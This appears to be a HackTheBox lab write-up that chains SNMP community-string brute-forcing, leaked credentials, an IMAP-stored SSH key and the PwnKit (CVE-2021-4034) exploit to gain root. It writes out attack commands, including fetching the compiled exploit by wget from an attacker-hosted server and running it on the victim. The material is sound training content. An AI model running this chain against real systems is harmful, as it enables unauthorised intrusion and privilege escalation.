# Day1 - footprinting_hard

- **Platform**: HackTheBox  
- **Category**: Multi-Service / Privilege Escalation  
- **Difficulty**: Hard  
- **Date**: 2025-05-1  
- **Tools Used**: Nmap, OpenSSL, onesixtyone, SNMP, IMAP, SSH, wget, gcc  

---

## Summary
This challenge simulated a real-world multi-vector intrusion. By enumerating exposed mail and SNMP services, I discovered leaked credentials for the user *Tom*. These allowed access to his IMAP mailbox, which contained an SSH private key. After pivoting into the system via SSH, I escalated privileges using the **PwnKit (CVE-2021-4034)** exploit, gained root access, and extracted sensitive data.

---

## Enumeration
1. **Port Scanning**
   ```bash
   nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.129.217.100
   ```
   - Results:
     - 22 → SSH  
     - 110 / 995 → POP3/POP3S  
     - 143 / 993 → IMAP/IMAPS  

2. **Service Validation**
   - Connected via OpenSSL:
     ```bash
     openssl s_client -connect 10.129.217.100:imaps
     ```
   - Confirmed Dovecot IMAP/POP3 in use.  
   - No default creds or anonymous login permitted.  

3. **Extended Scanning**
   - UDP scan revealed SNMP (161/udp).  
   - Brute-forced community strings:
     ```bash
     onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.217.100
     ```
   - Discovered valid string: `backup`.  

4. **SNMP Data**
   - Extracted:
     - System name: `NIXHARD`  
     - Contact: `tech@inlanefreight.htb`  
     - Credential leak: `tom / NMds732Js2761`  

5. **IMAP Access**
   - Logged into IMAPS with Tom’s credentials.  
   - Retrieved email containing Tom’s SSH private key.  

---

## Exploitation
1. **SSH Login**
   - Saved private key and logged into system as Tom:
     ```bash
     chmod 600 id_rsa_tom
     ssh -i id_rsa_tom tom@10.129.217.100
     ```
   - Established foothold with user-level shell.  

2. **Privilege Escalation**
   - Checked kernel:
     ```bash
     uname -a
     # Linux NIXHARD 5.4.0-90-generic
     ```
   - DirtyPipe exploit not applicable (requires ≥ 5.8).  
   - Researched alternatives → found **PwnKit** exploit.  

   - Compiled statically on attacker box:
     ```bash
     gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
     python3 -m http.server 8000
     ```
   - On victim:
     ```bash
     wget http://10.10.14.1:8000/PwnKit
     chmod +x PwnKit && ./PwnKit
     ```
   - Root shell obtained.  

3. **Flag Retrieval**
   - Verified privileges:
     ```bash
     id
     # uid=0(root) gid=0(root) groups=0(root)
     ```
   - Located sensitive files:
     ```bash
     find / -name root.txt 2>/dev/null
     cat /root/root.txt
     ```
   - Found `users.sql` containing additional credentials.  

---

## Lessons Learned
- **Layered enumeration** is critical — pivoting from IMAP/POP3 to SNMP uncovered credentials that weren’t obvious initially.  
- **SNMP misconfigurations** can leak critical secrets (user passwords, system info).  
- **Persistence and methodology** matter: chasing DirtyPipe wasted time, but revisiting basics led to the correct kernel exploit.  
- **PwnKit (CVE-2021-4034)** remains a reliable escalation vector on Ubuntu 20.04 systems.  
- Realistic pentests often require chaining multiple vulnerabilities across services to achieve root access.  
